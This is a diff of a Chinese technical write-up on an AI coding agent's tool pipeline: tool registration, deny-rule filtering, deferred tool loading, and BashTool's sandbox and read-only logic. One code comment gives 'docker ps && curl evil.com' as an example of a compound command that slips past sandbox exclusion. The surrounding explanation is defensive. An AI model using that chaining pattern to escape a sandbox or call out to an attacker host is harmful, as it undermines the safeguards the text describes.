-<span class="hljs-attr">sendOSNotification</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">opts</span>: { message: <span class="hljs-built_in">string</span>; notificationType: <span class="hljs-built_in">string</span> }</span>) =&gt;</span> <span class="hljs-built_in">void</span>
-<span class="hljs-attr">setStreamMode</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">mode</span>: <span class="hljs-title class_">SpinnerMode</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
+<pre><code class="lang-typescript">setToolJSX?: SetToolJSXFn
+addNotification?: (notif: Notification) =&gt; void
+sendOSNotification?: (opts: { message: string; notificationType: string }) =&gt; void
+setStreamMode?: (mode: SpinnerMode) =&gt; void
 </code></pre>
 <p>BashTool 在命令执行期间通过 <code>setToolJSX</code> 显示进度 UI，执行完成后设为 <code>null</code> 清除。</p>
 <h2 id="75-工具注册管道">7.5 工具注册管道</h2>
@@ -869,70 +710,70 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <p><code>src/tools.ts</code> 定义了工具从定义到模型可见的三层管道：</p>
 <pre><code>getAllBaseTools() -&gt; filterToolsByDenyRules() -&gt; assembleToolPool()
 </code></pre><h3 id="752-getallbasetools-全量工具列表">7.5.2 getAllBaseTools(): 全量工具列表</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getAllBaseTools</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Tools</span> {
-  <span class="hljs-keyword">return</span> [
-    <span class="hljs-title class_">AgentTool</span>,
-    <span class="hljs-title class_">TaskOutputTool</span>,
-    <span class="hljs-title class_">BashTool</span>,
-    ...(<span class="hljs-title function_">hasEmbeddedSearchTools</span>() ? [] : [<span class="hljs-title class_">GlobTool</span>, <span class="hljs-title class_">GrepTool</span>]),
-    <span class="hljs-title class_">ExitPlanModeV2Tool</span>,
-    <span class="hljs-title class_">FileReadTool</span>,
-    <span class="hljs-title class_">FileEditTool</span>,
-    <span class="hljs-title class_">FileWriteTool</span>,
-    <span class="hljs-title class_">NotebookEditTool</span>,
-    <span class="hljs-title class_">WebFetchTool</span>,
-    <span class="hljs-title class_">TodoWriteTool</span>,
-    <span class="hljs-title class_">WebSearchTool</span>,
-    <span class="hljs-title class_">TaskStopTool</span>,
-    <span class="hljs-title class_">AskUserQuestionTool</span>,
-    <span class="hljs-title class_">SkillTool</span>,
-    <span class="hljs-title class_">EnterPlanModeTool</span>,
-    <span class="hljs-comment">// ... 大量条件加载的工具</span>
-    ...(<span class="hljs-title function_">isToolSearchEnabledOptimistic</span>() ? [<span class="hljs-title class_">ToolSearchTool</span>] : []),
+<pre><code class="lang-typescript">export function getAllBaseTools(): Tools {
+  return [
+    AgentTool,
+    TaskOutputTool,
+    BashTool,
+    ...(hasEmbeddedSearchTools() ? [] : [GlobTool, GrepTool]),
+    ExitPlanModeV2Tool,
+    FileReadTool,
+    FileEditTool,
+    FileWriteTool,
+    NotebookEditTool,
+    WebFetchTool,
+    TodoWriteTool,
+    WebSearchTool,
+    TaskStopTool,
+    AskUserQuestionTool,
+    SkillTool,
+    EnterPlanModeTool,
+    // ... 大量条件加载的工具
+    ...(isToolSearchEnabledOptimistic() ? [ToolSearchTool] : []),
   ]
 }
 </code></pre>
 <p>关键设计点：</p>
 <p><strong>条件加载模式</strong>：大量工具通过 feature flag 和环境变量条件加载。如 <code>feature('PROACTIVE')</code> 使用 <code>bun:bundle</code> 的编译期 feature flag，实现死代码消除：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SleepTool</span> =
-  <span class="hljs-title function_">feature</span>(<span class="hljs-string">'PROACTIVE'</span>) || <span class="hljs-title function_">feature</span>(<span class="hljs-string">'KAIROS'</span>)
-    ? <span class="hljs-built_in">require</span>(<span class="hljs-string">'./tools/SleepTool/SleepTool.js'</span>).<span class="hljs-property">SleepTool</span>
-    : <span class="hljs-literal">null</span>
+<pre><code class="lang-typescript">const SleepTool =
+  feature('PROACTIVE') || feature('KAIROS')
+    ? require('./tools/SleepTool/SleepTool.js').SleepTool
+    : null
 </code></pre>
 <p>这种模式确保未启用的工具代码不会出现在最终产物中。</p>
 <p><strong>嵌入式搜索工具排除</strong>：当 ant 内部构建包含嵌入式 bfs/ugrep 时，<code>GlobTool</code> 和 <code>GrepTool</code> 被排除，因为 shell 中的 find/grep 已被别名到这些快速工具。</p>
 <p><strong>懒加载防循环依赖</strong>：TeamCreateTool/TeamDeleteTool 等通过函数包装的 <code>require()</code> 实现懒加载，打破 <code>tools.ts -&gt; Tool -&gt; ... -&gt; tools.ts</code> 的循环依赖。</p>
 <h3 id="753-filtertoolsbydenyrules-权限过滤">7.5.3 filterToolsByDenyRules(): 权限过滤</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> filterToolsByDenyRules&lt;
-  T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">mcpInfo</span>?: { <span class="hljs-attr">serverName</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span> } },
-&gt;(<span class="hljs-attr">tools</span>: <span class="hljs-keyword">readonly</span> T[], <span class="hljs-attr">permissionContext</span>: <span class="hljs-title class_">ToolPermissionContext</span>): T[] {
-  <span class="hljs-keyword">return</span> tools.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">tool</span> =&gt;</span> !<span class="hljs-title function_">getDenyRuleForTool</span>(permissionContext, tool))
+<pre><code class="lang-typescript">export function filterToolsByDenyRules&lt;
+  T extends { name: string; mcpInfo?: { serverName: string; toolName: string } },
+&gt;(tools: readonly T[], permissionContext: ToolPermissionContext): T[] {
+  return tools.filter(tool =&gt; !getDenyRuleForTool(permissionContext, tool))
 }
 </code></pre>
 <p>如果权限上下文中存在对某工具的全局 deny 规则（无 <code>ruleContent</code>，即无条件 deny），该工具在送给模型之前就被移除。支持 MCP 服务器前缀规则（如 <code>mcp__server</code> 移除该服务器的所有工具）。</p>
 <h3 id="754-gettools-组合过滤">7.5.4 getTools(): 组合过滤</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> getTools = (<span class="hljs-attr">permissionContext</span>: <span class="hljs-title class_">ToolPermissionContext</span>): <span class="hljs-function"><span class="hljs-params">Tools</span> =&gt;</span> {
-  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isEnvTruthy</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">CLAUDE_CODE_SIMPLE</span>)) {
-    <span class="hljs-keyword">const</span> <span class="hljs-attr">simpleTools</span>: <span class="hljs-title class_">Tool</span>[] = [<span class="hljs-title class_">BashTool</span>, <span class="hljs-title class_">FileReadTool</span>, <span class="hljs-title class_">FileEditTool</span>]
-    <span class="hljs-keyword">return</span> <span class="hljs-title function_">filterToolsByDenyRules</span>(simpleTools, permissionContext)
+<pre><code class="lang-typescript">export const getTools = (permissionContext: ToolPermissionContext): Tools =&gt; {
+  if (isEnvTruthy(process.env.CLAUDE_CODE_SIMPLE)) {
+    const simpleTools: Tool[] = [BashTool, FileReadTool, FileEditTool]
+    return filterToolsByDenyRules(simpleTools, permissionContext)
   }
 
-  <span class="hljs-keyword">const</span> tools = <span class="hljs-title function_">getAllBaseTools</span>().<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">tool</span> =&gt;</span> !specialTools.<span class="hljs-title function_">has</span>(tool.<span class="hljs-property">name</span>))
-  <span class="hljs-keyword">let</span> allowedTools = <span class="hljs-title function_">filterToolsByDenyRules</span>(tools, permissionContext)
+  const tools = getAllBaseTools().filter(tool =&gt; !specialTools.has(tool.name))
+  let allowedTools = filterToolsByDenyRules(tools, permissionContext)
 
-  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isReplModeEnabled</span>()) {
-    <span class="hljs-keyword">const</span> replEnabled = allowedTools.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">tool</span> =&gt;</span>
-      <span class="hljs-title function_">toolMatchesName</span>(tool, <span class="hljs-variable constant_">REPL_TOOL_NAME</span>),
+  if (isReplModeEnabled()) {
+    const replEnabled = allowedTools.some(tool =&gt;
+      toolMatchesName(tool, REPL_TOOL_NAME),
     )
-    <span class="hljs-keyword">if</span> (replEnabled) {
-      allowedTools = allowedTools.<span class="hljs-title function_">filter</span>(
-        <span class="hljs-function"><span class="hljs-params">tool</span> =&gt;</span> !<span class="hljs-variable constant_">REPL_ONLY_TOOLS</span>.<span class="hljs-title function_">has</span>(tool.<span class="hljs-property">name</span>),
+    if (replEnabled) {
+      allowedTools = allowedTools.filter(
+        tool =&gt; !REPL_ONLY_TOOLS.has(tool.name),
       )
     }
   }
 
-  <span class="hljs-keyword">const</span> isEnabled = allowedTools.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> _.<span class="hljs-title function_">isEnabled</span>())
-  <span class="hljs-keyword">return</span> allowedTools.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> isEnabled[i])
+  const isEnabled = allowedTools.map(_ =&gt; _.isEnabled())
+  return allowedTools.filter((_, i) =&gt; isEnabled[i])
 }
 </code></pre>
 <p>流程：</p>
@@ -948,24 +789,24 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 </blockquote>
 <h4 id="先读后改铁律">"先读后改"铁律</h4>
 <p>FileEditTool 强制执行了一条不可跳过的规则：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPreReadInstruction</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">string</span> {
-  <span class="hljs-keyword">return</span> <span class="hljs-string">'\n- You must use your `Read` tool at least once in the '</span>
-    + <span class="hljs-string">'conversation before editing. This tool will error if you attempt '</span>
-    + <span class="hljs-string">'an edit without reading the file.'</span>
+<pre><code class="lang-typescript">function getPreReadInstruction(): string {
+  return '\n- You must use your `Read` tool at least once in the '
+    + 'conversation before editing. This tool will error if you attempt '
+    + 'an edit without reading the file.'
 }
 </code></pre>
 <p>FileEditTool 会检查你是否已经用 FileReadTool 读过这个文件，如果没有，直接报错不让改。这就是为什么 Claude Code 不会像某些工具那样"凭空写一段代码覆盖你的文件"——它被强制要求先理解再修改。</p>
 <h3 id="755-assembletoolpool-最终组装">7.5.5 assembleToolPool(): 最终组装</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">assembleToolPool</span>(<span class="hljs-params">
-  <span class="hljs-attr">permissionContext</span>: <span class="hljs-title class_">ToolPermissionContext</span>,
-  <span class="hljs-attr">mcpTools</span>: <span class="hljs-title class_">Tools</span>,
-</span>): <span class="hljs-title class_">Tools</span> {
-  <span class="hljs-keyword">const</span> builtInTools = <span class="hljs-title function_">getTools</span>(permissionContext)
-  <span class="hljs-keyword">const</span> allowedMcpTools = <span class="hljs-title function_">filterToolsByDenyRules</span>(mcpTools, permissionContext)
-  <span class="hljs-keyword">const</span> <span class="hljs-title function_">byName</span> = (<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-title class_">Tool</span>, <span class="hljs-attr">b</span>: <span class="hljs-title class_">Tool</span></span>) =&gt; a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>)
-  <span class="hljs-keyword">return</span> <span class="hljs-title function_">uniqBy</span>(
-    [...builtInTools].<span class="hljs-title function_">sort</span>(byName).<span class="hljs-title function_">concat</span>(allowedMcpTools.<span class="hljs-title function_">sort</span>(byName)),
-    <span class="hljs-string">'name'</span>,
+<pre><code class="lang-typescript">export function assembleToolPool(
+  permissionContext: ToolPermissionContext,
+  mcpTools: Tools,
+): Tools {
+  const builtInTools = getTools(permissionContext)
+  const allowedMcpTools = filterToolsByDenyRules(mcpTools, permissionContext)
+  const byName = (a: Tool, b: Tool) =&gt; a.name.localeCompare(b.name)
+  return uniqBy(
+    [...builtInTools].sort(byName).concat(allowedMcpTools.sort(byName)),
+    'name',
   )
 }
 </code></pre>
@@ -977,13 +818,13 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 </ul>
 <h2 id="76-toolsearch-延迟加载机制">7.6 ToolSearch 延迟加载机制</h2>
 <p>当工具数量超过阈值时，ToolSearch 启用。部分工具的 schema 不会在初始 prompt 中发送，而是标记为 <code>defer_loading: true</code>。模型需要先调用 ToolSearch 工具来获取完整 schema，然后才能调用这些延迟工具。</p>
-<pre><code class="lang-typescript"><span class="hljs-comment">// Tool 接口中的相关字段</span>
-<span class="hljs-keyword">readonly</span> <span class="hljs-attr">shouldDefer</span>?: <span class="hljs-built_in">boolean</span>      <span class="hljs-comment">// 设为 true 则延迟加载</span>
-<span class="hljs-keyword">readonly</span> <span class="hljs-attr">alwaysLoad</span>?: <span class="hljs-built_in">boolean</span>       <span class="hljs-comment">// 设为 true 则永不延迟</span>
-<span class="hljs-attr">searchHint</span>?: <span class="hljs-built_in">string</span>                 <span class="hljs-comment">// 帮助 ToolSearch 做关键词匹配</span>
+<pre><code class="lang-typescript">// Tool 接口中的相关字段
+readonly shouldDefer?: boolean      // 设为 true 则延迟加载
+readonly alwaysLoad?: boolean       // 设为 true 则永不延迟
+searchHint?: string                 // 帮助 ToolSearch 做关键词匹配
 </code></pre>
 <p>在 <code>tools.ts</code> 中，ToolSearchTool 本身也是条件加载的：</p>
-<pre><code class="lang-typescript">...(<span class="hljs-title function_">isToolSearchEnabledOptimistic</span>() ? [<span class="hljs-title class_">ToolSearchTool</span>] : []),
+<pre><code class="lang-typescript">...(isToolSearchEnabledOptimistic() ? [ToolSearchTool] : []),
 </code></pre>
 <p><code>isToolSearchEnabledOptimistic()</code> 是一个乐观检查——在请求时才做最终决定。</p>
 <h2 id="77-bashtool-源码深入分析">7.7 BashTool 源码深入分析</h2>
@@ -998,65 +839,65 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <li>大输出持久化</li>
 </ol>
 <h3 id="772-输入-schema">7.7.2 输入 Schema</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> fullInputSchema = <span class="hljs-title function_">lazySchema</span>(<span class="hljs-function">() =&gt;</span> z.<span class="hljs-title function_">strictObject</span>({
-  <span class="hljs-attr">command</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">'The command to execute'</span>),
-  <span class="hljs-attr">timeout</span>: <span class="hljs-title function_">semanticNumber</span>(z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">optional</span>()),
-  <span class="hljs-attr">description</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>(),
-  <span class="hljs-attr">run_in_background</span>: <span class="hljs-title function_">semanticBoolean</span>(z.<span class="hljs-title function_">boolean</span>().<span class="hljs-title function_">optional</span>()),
-  <span class="hljs-attr">dangerouslyDisableSandbox</span>: <span class="hljs-title function_">semanticBoolean</span>(z.<span class="hljs-title function_">boolean</span>().<span class="hljs-title function_">optional</span>()),
-  <span class="hljs-attr">_simulatedSedEdit</span>: z.<span class="hljs-title function_">object</span>({
-    <span class="hljs-attr">filePath</span>: z.<span class="hljs-title function_">string</span>(),
-    <span class="hljs-attr">newContent</span>: z.<span class="hljs-title function_">string</span>()
-  }).<span class="hljs-title function_">optional</span>()
+<pre><code class="lang-typescript">const fullInputSchema = lazySchema(() =&gt; z.strictObject({
+  command: z.string().describe('The command to execute'),
+  timeout: semanticNumber(z.number().optional()),
+  description: z.string().optional(),
+  run_in_background: semanticBoolean(z.boolean().optional()),
+  dangerouslyDisableSandbox: semanticBoolean(z.boolean().optional()),
+  _simulatedSedEdit: z.object({
+    filePath: z.string(),
+    newContent: z.string()
+  }).optional()
 }))
 </code></pre>
 <p><code>_simulatedSedEdit</code> 是内部字段，在面向模型的 schema 中被 <code>omit</code> 掉：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> inputSchema = <span class="hljs-title function_">lazySchema</span>(<span class="hljs-function">() =&gt;</span>
+<pre><code class="lang-typescript">const inputSchema = lazySchema(() =&gt;
   isBackgroundTasksDisabled
-    ? <span class="hljs-title function_">fullInputSchema</span>().<span class="hljs-title function_">omit</span>({ <span class="hljs-attr">run_in_background</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">_simulatedSedEdit</span>: <span class="hljs-literal">true</span> })
-    : <span class="hljs-title function_">fullInputSchema</span>().<span class="hljs-title function_">omit</span>({ <span class="hljs-attr">_simulatedSedEdit</span>: <span class="hljs-literal">true</span> })
+    ? fullInputSchema().omit({ run_in_background: true, _simulatedSedEdit: true })
+    : fullInputSchema().omit({ _simulatedSedEdit: true })
 )
 </code></pre>
 <p>这个字段由 SedEditPermissionRequest 在用户批准 sed 预览后设置，确保写入内容与预览完全一致。如果暴露在 schema 中，模型可能绕过权限检查。</p>
 <h3 id="773-沙箱判断">7.7.3 沙箱判断</h3>
 <p>沙箱判断逻辑在 <code>shouldUseSandbox.ts</code> 中：</p>
-<pre><code class="lang-typescript"><span class="hljs-comment">// src/tools/BashTool/shouldUseSandbox.ts</span>
-<span class="hljs-keyword">type</span> <span class="hljs-title class_">SandboxInput</span> = {
-  <span class="hljs-attr">command</span>?: <span class="hljs-built_in">string</span>
-  <span class="hljs-attr">dangerouslyDisableSandbox</span>?: <span class="hljs-built_in">boolean</span>
+<pre><code class="lang-typescript">// src/tools/BashTool/shouldUseSandbox.ts
+type SandboxInput = {
+  command?: string
+  dangerouslyDisableSandbox?: boolean
 }
 </code></pre>
 <p><code>containsExcludedCommand()</code> 函数检查命令是否应排除沙箱：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">containsExcludedCommand</span>(<span class="hljs-params"><span class="hljs-attr">command</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">boolean</span> {
-  <span class="hljs-comment">// 1. 检查动态配置的禁用命令（仅 ant 内部）</span>
-  <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">USER_TYPE</span> === <span class="hljs-string">'ant'</span>) {
-    <span class="hljs-keyword">const</span> disabledCommands = <span class="hljs-title function_">getFeatureValue_CACHED_MAY_BE_STALE</span>(...)
-    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> substring <span class="hljs-keyword">of</span> disabledCommands.<span class="hljs-property">substrings</span>) {
-      <span class="hljs-keyword">if</span> (command.<span class="hljs-title function_">includes</span>(substring)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
+<pre><code class="lang-typescript">function containsExcludedCommand(command: string): boolean {
+  // 1. 检查动态配置的禁用命令（仅 ant 内部）
+  if (process.env.USER_TYPE === 'ant') {
+    const disabledCommands = getFeatureValue_CACHED_MAY_BE_STALE(...)
+    for (const substring of disabledCommands.substrings) {
+      if (command.includes(substring)) return true
     }
-    <span class="hljs-comment">// 检查子命令前缀匹配</span>
+    // 检查子命令前缀匹配
   }
 
-  <span class="hljs-comment">// 2. 检查用户设置中的排除命令</span>
-  <span class="hljs-keyword">const</span> settings = <span class="hljs-title function_">getSettings_DEPRECATED</span>()
-  <span class="hljs-keyword">const</span> userExcludedCommands = settings.<span class="hljs-property">sandbox</span>?.<span class="hljs-property">excludedCommands</span> ?? []
+  // 2. 检查用户设置中的排除命令
+  const settings = getSettings_DEPRECATED()
+  const userExcludedCommands = settings.sandbox?.excludedCommands ?? []
 
-  <span class="hljs-comment">// 3. 拆分复合命令逐一检查（防止 "docker ps &amp;&amp; curl evil.com" 逃逸）</span>
-  <span class="hljs-keyword">let</span> subcommands = <span class="hljs-title function_">splitCommand_DEPRECATED</span>(command)
-  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> subcommand <span class="hljs-keyword">of</span> subcommands) {
-    <span class="hljs-comment">// 迭代式剥离环境变量和包装命令（timeout、env 等）</span>
-    <span class="hljs-comment">// 匹配通配符模式</span>
+  // 3. 拆分复合命令逐一检查（防止 "docker ps &amp;&amp; curl evil.com" 逃逸）
+  let subcommands = splitCommand_DEPRECATED(command)
+  for (const subcommand of subcommands) {
+    // 迭代式剥离环境变量和包装命令（timeout、env 等）
+    // 匹配通配符模式
   }
 }
 </code></pre>
 <p>注意源码中的安全注释：<code>excludedCommands</code> 是用户便利功能，不是安全边界。真正的安全控制是沙箱的权限提示系统。</p>
 <h3 id="774-命令语义分析">7.7.4 命令语义分析</h3>
 <p>BashTool 维护了多组命令集合来分类命令行为：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASH_SEARCH_COMMANDS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'find'</span>, <span class="hljs-string">'grep'</span>, <span class="hljs-string">'rg'</span>, <span class="hljs-string">'ag'</span>, <span class="hljs-string">'ack'</span>, <span class="hljs-string">'locate'</span>, <span class="hljs-string">'which'</span>, <span class="hljs-string">'whereis'</span>])
-<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASH_READ_COMMANDS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'cat'</span>, <span class="hljs-string">'head'</span>, <span class="hljs-string">'tail'</span>, <span class="hljs-string">'less'</span>, <span class="hljs-string">'more'</span>, <span class="hljs-string">'wc'</span>, <span class="hljs-string">'stat'</span>, <span class="hljs-string">'file'</span>, <span class="hljs-string">'strings'</span>, <span class="hljs-string">'jq'</span>, <span class="hljs-string">'awk'</span>, <span class="hljs-string">'cut'</span>, <span class="hljs-string">'sort'</span>, <span class="hljs-string">'uniq'</span>, <span class="hljs-string">'tr'</span>])
-<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASH_LIST_COMMANDS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'ls'</span>, <span class="hljs-string">'tree'</span>, <span class="hljs-string">'du'</span>])
-<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASH_SEMANTIC_NEUTRAL_COMMANDS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'echo'</span>, <span class="hljs-string">'printf'</span>, <span class="hljs-string">'true'</span>, <span class="hljs-string">'false'</span>, <span class="hljs-string">':'</span>])
-<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASH_SILENT_COMMANDS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-string">'mv'</span>, <span class="hljs-string">'cp'</span>, <span class="hljs-string">'rm'</span>, <span class="hljs-string">'mkdir'</span>, <span class="hljs-string">'rmdir'</span>, <span class="hljs-string">'chmod'</span>, <span class="hljs-string">'chown'</span>, <span class="hljs-string">'chgrp'</span>, <span class="hljs-string">'touch'</span>, <span class="hljs-string">'ln'</span>, <span class="hljs-string">'cd'</span>, <span class="hljs-string">'export'</span>, <span class="hljs-string">'unset'</span>, <span class="hljs-string">'wait'</span>])
+<pre><code class="lang-typescript">const BASH_SEARCH_COMMANDS = new Set(['find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'])
+const BASH_READ_COMMANDS = new Set(['cat', 'head', 'tail', 'less', 'more', 'wc', 'stat', 'file', 'strings', 'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'])
+const BASH_LIST_COMMANDS = new Set(['ls', 'tree', 'du'])
+const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set(['echo', 'printf', 'true', 'false', ':'])
+const BASH_SILENT_COMMANDS = new Set(['mv', 'cp', 'rm', 'mkdir', 'rmdir', 'chmod', 'chown', 'chgrp', 'touch', 'ln', 'cd', 'export', 'unset', 'wait'])
 </code></pre>
 <p><code>isSearchOrReadBashCommand()</code> 的判断逻辑：</p>
 <ol>
@@ -1065,134 +906,134 @@ interruptBehavior?(): <span class="hljs-string">'cancel'</span> | <span class="h
 <li>跳过语义中性命令（echo, printf 等）</li>
 <li>管道中所有部分都必须是搜索/读取命令，才认为整个命令可折叠</li>
 </ol>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isSearchOrReadBashCommand</span>(<span class="hljs-params"><span class="hljs-attr">command</span>: <span class="hljs-built_in">string</span></span>): {
-  <span class="hljs-attr">isSearch</span>: <span class="hljs-built_in">boolean</span>;
-  <span class="hljs-attr">isRead</span>: <span class="hljs-built_in">boolean</span>;
-  <span class="hljs-attr">isList</span>: <span class="hljs-built_in">boolean</span>;
+<pre><code class="lang-typescript">export function isSearchOrReadBashCommand(command: string): {
+  isSearch: boolean;
+  isRead: boolean;
+  isList: boolean;
 } {
-  <span class="hljs-comment">// ...对每个子命令：</span>
-  <span class="hljs-keyword">const</span> isPartSearch = <span class="hljs-variable constant_">BASH_SEARCH_COMMANDS</span>.<span class="hljs-title function_">has</span>(baseCommand)
-  <span class="hljs-keyword">const</span> isPartRead = <span class="hljs-variable constant_">BASH_READ_COMMANDS</span>.<span class="hljs-title function_">has</span>(baseCommand)
-  <span class="hljs-keyword">const</span> isPartList = <span class="hljs-variable constant_">BASH_LIST_COMMANDS</span>.<span class="hljs-title function_">has</span>(baseCommand)
-  <span class="hljs-keyword">if</span> (!isPartSearch &amp;&amp; !isPartRead &amp;&amp; !isPartList) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">isSearch</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">isRead</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">isList</span>: <span class="hljs-literal">false</span> }
+  // ...对每个子命令：
+  const isPartSearch = BASH_SEARCH_COMMANDS.has(baseCommand)
+  const isPartRead = BASH_READ_COMMANDS.has(baseCommand)
+  const isPartList = BASH_LIST_COMMANDS.has(baseCommand)
+  if (!isPartSearch &amp;&amp; !isPartRead &amp;&amp; !isPartList) {
+    return { isSearch: false, isRead: false, isList: false }
   }
-  <span class="hljs-comment">// ...</span>
+  // ...
 }
 </code></pre>
 <h3 id="775-只读判断与安全解析">7.7.5 只读判断与安全解析</h3>
-<pre><code class="lang-typescript"><span class="hljs-title function_">isReadOnly</span>(<span class="hljs-params">input</span>) {
-  <span class="hljs-keyword">const</span> compoundCommandHasCd = <span class="hljs-title function_">commandHasAnyCd</span>(input.<span class="hljs-property">command</span>)
-  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">checkReadOnlyConstraints</span>(input, compoundCommandHasCd)
-  <span class="hljs-keyword">return</span> result.<span class="hljs-property">behavior</span> === <span class="hljs-string">'allow'</span>
+<pre><code class="lang-typescript">isReadOnly(input) {
+  const compoundCommandHasCd = commandHasAnyCd(input.command)
+  const result = checkReadOnlyConstraints(input, compoundCommandHasCd)
+  return result.behavior === 'allow'
 },
 </code></pre>
 <p>BashTool 的 <code>isConcurrencySafe</code> 直接委托给 <code>isReadOnly</code>：</p>
-<pre><code class="lang-typescript"><span class="hljs-title function_">isConcurrencySafe</span>(<span class="hljs-params">input</span>) {
-  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isReadOnly</span>?.(input) ?? <span class="hljs-literal">false</span>
+<pre><code class="lang-typescript">isConcurrencySafe(input) {
+  return this.isReadOnly?.(input) ?? false
 },
 </code></pre>
 <p>权限匹配器使用 AST 级别的安全解析：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">preparePermissionMatcher</span>(<span class="hljs-params">{ command }</span>) {
-  <span class="hljs-keyword">const</span> parsed = <span class="hljs-keyword">await</span> <span class="hljs-title function_">parseForSecurity</span>(command)
-  <span class="hljs-keyword">if</span> (parsed.<span class="hljs-property">kind</span> !== <span class="hljs-string">'simple'</span>) {
-    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">true</span>  <span class="hljs-comment">// 解析失败时 fail-safe，运行所有 hook</span>
+<pre><code class="lang-typescript">async preparePermissionMatcher({ command }) {
+  const parsed = await parseForSecurity(command)
+  if (parsed.kind !== 'simple') {
+    return () =&gt; true  // 解析失败时 fail-safe，运行所有 hook
   }
-  <span class="hljs-keyword">const</span> subcommands = parsed.<span class="hljs-property">commands</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.<span class="hljs-property">argv</span>.<span class="hljs-title function_">join</span>(<span class="hljs-string">' '</span>))
-  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">pattern</span> =&gt;</span> {
-    <span class="hljs-keyword">const</span> prefix = <span class="hljs-title function_">permissionRuleExtractPrefix</span>(pattern)
-    <span class="hljs-keyword">return</span> subcommands.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">cmd</span> =&gt;</span> {
-      <span class="hljs-keyword">if</span> (prefix !== <span class="hljs-literal">null</span>) {
-        <span class="hljs-keyword">return</span> cmd === prefix || cmd.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">`<span class="hljs-subst">${prefix}</span> `</span>)
+  const subcommands = parsed.commands.map(c =&gt; c.argv.join(' '))
+  return pattern =&gt; {
+    const prefix = permissionRuleExtractPrefix(pattern)
+    return subcommands.some(cmd =&gt; {
+      if (prefix !== null) {
+        return cmd === prefix || cmd.startsWith(`${prefix} `)
       }
-      <span class="hljs-keyword">return</span> <span class="hljs-title function_">matchWildcardPattern</span>(pattern, cmd)
+      return matchWildcardPattern(pattern, cmd)
     })
   }
 },
 </code></pre>
